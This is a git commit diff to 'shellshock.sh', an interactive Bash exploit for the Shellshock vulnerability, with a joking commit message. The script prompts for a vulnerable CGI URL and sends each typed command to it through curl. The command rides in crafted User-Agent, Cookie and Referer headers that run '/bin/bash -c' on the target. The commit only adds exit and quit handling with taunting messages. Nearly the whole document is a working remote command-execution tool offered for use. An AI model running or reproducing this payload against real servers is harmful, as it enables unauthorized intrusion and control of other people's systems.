5f1f61ad90f7d49c1e840b6fa98e919d56706703
rl1k <nomail@mail.com>
2018-10-09 20:34:59 +0200

    add some message, yeah i dont know what to do lol im bored

--- shellshock.sh
+++ shellshock.sh
@@ -12,11 +12,19 @@ read -p "Enter the vulnerable url: " url
 
 #url=http://shellshock-vulnerable.com/cgi-bin/status
 
-echo -e "${green}Enter your command: "
+echo -e "${green}Enter your command:${YELLOW} "
 while read cmd
 do
-   content=$(curl -s -A "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -b "() { shelshocked; }; echo; /bin/bash -c \"$cmd\"" -e "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H 'Connection: close' $url)
-   echo ${red}$content
-   echo "${reset}__________________________________________________________________" ;
-   echo -e "${green}Enter a command: ${YELLOW}";
+    if [[ $cmd == "exit" || $cmd == "quit" ]];then
+         echo -e "${reset}See Ya next time n00b!!"
+         exit 1;
+    elif [[ $cmd == "bye" ]];then
+        echo -e "${red}WTF!!You think we are friend or...Go out and never go back!!!"
+        exit 1;
+   else 
+        content=$(curl -s -A "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -b "() { shelshocked; }; echo; /bin/bash -c \"$cmd\"" -e "() { shellshocked; }; echo; /bin/bash -c \"$cmd\"" -H 'Connection: close' $url)
+        echo ${red}$content
+        echo "${reset}__________________________________________________________________" ;
+        echo -e "${green}Enter a command: ${YELLOW}";
+   fi
 done
